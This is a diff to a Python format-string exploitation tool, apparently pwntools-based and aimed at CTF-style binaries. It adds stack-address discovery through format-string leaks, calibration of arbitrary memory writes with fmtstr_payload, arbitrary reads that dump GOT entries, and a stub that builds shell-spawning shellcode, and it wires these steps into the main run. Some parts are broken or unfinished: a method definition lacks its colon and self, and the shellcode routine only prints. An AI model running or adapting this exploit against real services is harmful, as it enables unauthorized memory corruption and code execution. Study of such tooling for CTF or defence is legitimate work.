@@ -44,6 +44,9 @@ class ffstr():
 		# Stack address
 		self.addr	= None
 		
+		# Write Calibration
+		self.calibration = None
+		
 		# Format string delimiters
 		self.delimiters = [b"   d34d|",b"|b33f   "]
 		
@@ -86,13 +89,16 @@ class ffstr():
 			if args["BITS"] == "32":
 				self.bits = 32
 				self.block_byte = 4
+				context.arch = 'i386'
 			else:
 				self.bits = 64
 				self.block_byte = 8
+				context.arch = 'amd64'
 		else:
 				# By default
 				self.bits = 64
 				self.block_byte = 8
+				context.arch = 'amd64'
 				
 		# Timeout setting
 		if "TOUT" in args.keys():
@@ -123,6 +129,15 @@ class ffstr():
 		# Reload DUMPED FILE
 		if "DUMPED" in args.keys():
 			self.dump_name = args.DUMPED
+			
+		# Stack address
+		if "STACKADR" in args.keys():
+			addr,offset= args.STACKADR.split(":")
+			self.addr = (int(addr),int(offset))
+			
+		# Write Calibration
+		if "CALIB" in args.keys():
+			self.calibration = int(args.CALIB)
 			
 	def set_future_args(self,txt):
 		self.future_args.append(txt)
@@ -423,6 +438,10 @@ class ffstr():
 		
 	def stackGPS(self,n=100):
 	
+		# Lazy mode
+		if self.addr is not None:
+			return
+			
 		# find stack address and relate to the format string injection address
 		print("Stack localisation ...")
 		
@@ -471,9 +490,87 @@ class ffstr():
 				
 				print("Leak "+hex(leak-4*k)+" ",data[:35],end="\r")
 				if data.find(self.delimiters[0]*2)>-1:
-					print("Found at argument ",i," offset ", 4*k)
-					self.addr=(i,4*k)
+					print("Found at argument ",i+1," offset ", 4*k)
+					print(data)
+					self.addr=(i+1,4*k)
+					self.set_future_args("STACKADR="+str(i+1)+":"+str(4*k))
 					return
+					
+	def calibrateStackWrite(self,n=100):
+	
+		# Lazy mode
+		if self.calibration is not None:
+			return
+		
+		# Checking the number of previous characters
+		for nbw in range(n): 
+			
+			# Stack Saved rbp
+			stackrbp,offset = self.addr
+			
+			# Closing connection
+			self.close()
+			
+			# Leak an hexadecimal value
+			leak = None
+			
+			data = self.asyncExchange(self.stackPayload(stackrbp,b"p",left=self.delimiters[0],right=self.delimiters[1])) #
+			regex = re.search(self.re_HexaPattern, data)
+			if regex:
+				try:
+					leak = int(regex[0],16)
+				except:
+					self.close()
+					break
+
+			# write format string
+			if self.bits == 32:
+				write={leak-offset*0:0x41414141}
+				pl = b"B"*8+fmtstr_payload(self.stack_arg, write, numbwritten=nbw)
+			else:
+				write={leak-offset*0:0x4141414141414141}
+				pl = b"B"*8+fmtstr_payload(self.stack_arg, write, numbwritten=nbw, write_size='short')
+				print(pl)
+				
+			# Get Data
+			data = b""
+			data = self.asyncExchange(pl)
+				
+			# Read and check if calibrated
+			_leak = None
+			while _leak is None:
+				data = self.asyncExchange(self.readAnywhere(leak-offset*0,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])) #
+				regex = re.search(self.re_HexaPattern, data)
+				try:
+					_leak = regex[0]
+				except:
+					self.close()
+					break
+			
+			# check if writing is successful
+			if data.find(b"AAAA")>-1:
+				print("Writing calibration found : "+str(nbw+1-8))
+				self.set_future_args("CALIB="+str(nbw+1-8))
+				self.calibration = nbw+1-8
+				return
+				
+				
+	def ret2win()
+		# try a return to win attack
+		pass
+				
+		
+	def stackshellcode(self):
+		# injection shellcode on the stack and re-route the program
+		
+		# if stack address has not been identified
+		if self.addr is None:
+			return
+		
+		# Shellcode	
+		shellcode = asm(shellcraft.sh())
+			
+		print("SHELLCODE",shellcode)
 
 			
 	def locateBinary(self):
@@ -713,7 +810,7 @@ class ffstr():
 			
 		print(strings)
 		print(got)
-		
+		k=0
 		for elt in got:
 		
 			# Get location
@@ -726,14 +823,22 @@ class ffstr():
 				regex = re.search(self.re_HexaPattern, data)
 				if regex:
 					leak = int(regex[0],16)
-						
+				
+			# relocate 		
+			plt_got = int("0x"+elt,16)
+			if plt_got < leak-offset:
+				plt_got += 0x401040+k*16
+				k+=1
+				print(hex(plt_got))
+			
 			# Read anywhere format string
-			pl = self.readAnywhere(int("0x"+elt,16),minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])
+			pl = self.readAnywhere(plt_got,minsize=8,leftpad=self.delimiters[0],rightpad=self.delimiters[1])
 			
 			# Get Data
 			data = b""
 			while not (data.find(self.delimiters[0]) > -1 and data.find(self.delimiters[1]) >-1):
 				data += self.asyncExchange(pl)
+			print(data)
 			left = data.find(self.delimiters[0])+len(self.delimiters[0])
 			right= data.find(self.delimiters[1])
 			dump =data[left:right]
@@ -783,7 +888,9 @@ if __name__ == "__main__":
 	exploit.mentalist(nb_input=10)
 	exploit.stackDump(nb_elt=200)
 	exploit.stackAnalyze()
-	#exploit.stackGPS()
+	exploit.stackGPS()
+	exploit.calibrateStackWrite()
+	exploit.stackshellcode()
 	exploit.locateBinary()
 	exploit.dumpBinary()
 	exploit.showSymbols()
